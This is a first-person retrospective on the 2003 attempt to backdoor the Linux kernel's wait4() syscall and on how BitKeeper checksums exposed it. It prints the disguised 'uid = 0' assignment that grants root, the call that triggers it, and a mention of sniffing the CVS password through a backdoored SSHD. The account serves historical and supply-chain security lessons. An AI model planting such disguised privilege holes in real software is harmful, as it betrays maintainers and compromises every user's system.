Let's use a syscall that's seldom used. wait4() looks promising. Takes
some special parameters that no normal program would ever use by accident.

kernel/exit.c in the wait4() syscall contains some sanity checks at the
start of the function: A series of if-statements checking that the calling
process is allowed to make this call and that the parameters make sense.

I added an additional if-statement (2 lines):

if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
    return -EINVAL;

Compiles without warning. Can you see the backdoor? Tiny source changes can
have major security implications.

Yes, "current->uid = 0" instead of "current->uid == 0". The former does not
check if the UID is zero but instead _changes_ the uid of the process to
zero.

A Kernel Level b00m shell. Any process calling

"wait4(0, NULL, __WCLONE|__WALL, NULL);"

would get root privileges. 

I sent my patch to my friend and I go to sleep. I wake up and see the
Linux Kernel Mailinglist on fire.

What did we do wrong? How did they find out?

We had to wait for the public press release to find out:

Larry McVoy (BitKeeper's author) kept a master copy of the Linux Kernel
Source code and tracked the checksums of every commit. I salute his
paranoia. Our modification triggered a mismatch. Some other developer then
noticed that "=" is not the same as "==".

Yes, indeed, it is not.

We tried. We failed. You won.

We were sad but also glad you found out - but you almost didn't. This was
us, a bunch of kids, between 2am and 4am.

History was made (for both sides).

A Zeitwende. Before 2003, many developers focused primarily on writing
secure code and not on their own infrastructure. The attitude back then was
much like "hacking incidents only happen to others" and "we know better".

The password to the CVS server was 4 letters followed by 2-3 digits or so
(sniffed via a backdoored SSHD running on the shell server that was used by
the developers to access the Linux Kernel CVS).

A shift in mindset happened. Nobody is immune to attacks.

You now call it "software supply chain security".

Linus Torvalds eventually developed Git (2005) — where every commit is
cryptographically hashed, making this kind of silent tampering detectable
by design.

Password security has improved.

I'm glad about this outcome. I'm glad it was us who took you for a ride and
not some APT.
